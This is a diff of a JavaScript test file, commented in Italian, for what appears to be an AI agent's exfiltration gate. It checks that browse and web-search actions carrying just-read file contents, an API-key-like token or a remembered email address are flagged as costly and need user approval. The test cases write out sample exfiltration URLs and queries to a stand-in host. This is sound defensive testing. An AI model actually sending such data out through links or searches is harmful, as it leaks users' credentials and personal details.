@@ -35,23 +35,23 @@ const cat = (stdout) => ({
   _output: { command: 'cat ~/gestionale.txt', stdout, stderr: '', code: 0 },
 });
 
-// Il livello che il gate darebbe a NAVIGA in questo turno.
+// Il costo che il registro dà a NAVIGA in questo turno (1 normale, 2 se porta fuori dati).
 function livello(url, azioni, { daPagina = false, memoria = '' } = {}) {
   const action = { type: 'NAVIGA', url };
   const v = E.valutaNaviga(url, { memoria, azioni, daPagina });
   if (v.exfil) { action._exfil = true; action._exfilReason = v.reason; }
-  return AL.levelFor(action);
+  return AL.costoFor(action);
 }
 
-// Il livello che il gate darebbe a CERCA_WEB in questo turno.
+// Il costo che il registro dà a CERCA_WEB in questo turno (0 leggere, 2 se porta fuori dati).
 function livelloRicerca(query, azioni, { memoria = '' } = {}) {
   const action = { type: 'CERCA_WEB', query };
   const v = E.valutaRicerca(query, { memoria, azioni });
   if (v.exfil) { action._exfil = true; action._exfilReason = v.reason; }
-  return AL.levelFor(action);
+  return AL.costoFor(action);
 }
 
-test('cat seguito da NAVIGA con 40 caratteri dell’output: livello 2 (prima era 1)', () => {
+test('cat seguito da NAVIGA con 40 caratteri dell’output: costo 2 (prima era 1)', () => {
   for (let da = 0; da + 40 <= FILE.length; da += 7) {
     const pezzo = FILE.slice(da, da + 40);
     for (const url of [
@@ -101,22 +101,22 @@ test('link normali dopo un comando: nessun OK in più', () => {
 test('CERCA_WEB porta fuori un dato → chiede un OK, come il link (#587 giro 10)', () => {
   const gestionale = cat(FILE);
   // Un pezzo verbatim di ciò che è stato letto, messo nella query: esce verso il
-  // motore di ricerca esattamente come in un URL → livello 2.
+  // motore di ricerca esattamente come in un URL → costo 2.
   const pezzo = FILE.slice(10, 55);
   assert.equal(livelloRicerca(pezzo, [gestionale]), 2, 'pezzo letto nella query');
   assert.equal(livello(`https://x.example/?q=${encodeURIComponent(pezzo)}`, [gestionale]), 2, 'stesso pezzo in un link');
   // Un token con lettere e cifre appena letto.
   assert.equal(livelloRicerca('cerca sk7Hq2Lm su internet', [cat('OPENAI_API_KEY=sk7Hq2Lm\n')]), 2);
-  // Un dato forte della memoria (l'email) esce → livello 2.
+  // Un dato forte della memoria (l'email) esce → costo 2.
   assert.equal(livelloRicerca('scrivi a sathyarampontillo@gmail.com', [], { memoria: 'Email: sathyarampontillo@gmail.com' }), 2);
   // Parole comuni che stanno anche nel profilo/appunti NON bastano: una query di
   // ricerca ne condivide spesso qualcuna, e da sole non sono un segreto.
   const memoria = 'Preferenze: tema scuro, lingua italiana. Appunti: idee per le vacanze in montagna.';
-  assert.equal(livelloRicerca('le mie preferenze di lingua italiana', [], { memoria }), 1);
-  assert.equal(livelloRicerca('idee per le vacanze in montagna', [], { memoria }), 1);
+  assert.equal(livelloRicerca('le mie preferenze di lingua italiana', [], { memoria }), 0);
+  assert.equal(livelloRicerca('idee per le vacanze in montagna', [], { memoria }), 0);
   // Ricerche di tutti i giorni: nessun OK, anche con un file letto nel turno.
   for (const q of ['che tempo fa domani a Bologna', 'ricetta della carbonara', 'orari treni milano torino', 'come si chiama il regista di Dune']) {
-    assert.equal(livelloRicerca(q, [gestionale]), 1, q);
+    assert.equal(livelloRicerca(q, [gestionale]), 0, q);
   }
 });
 
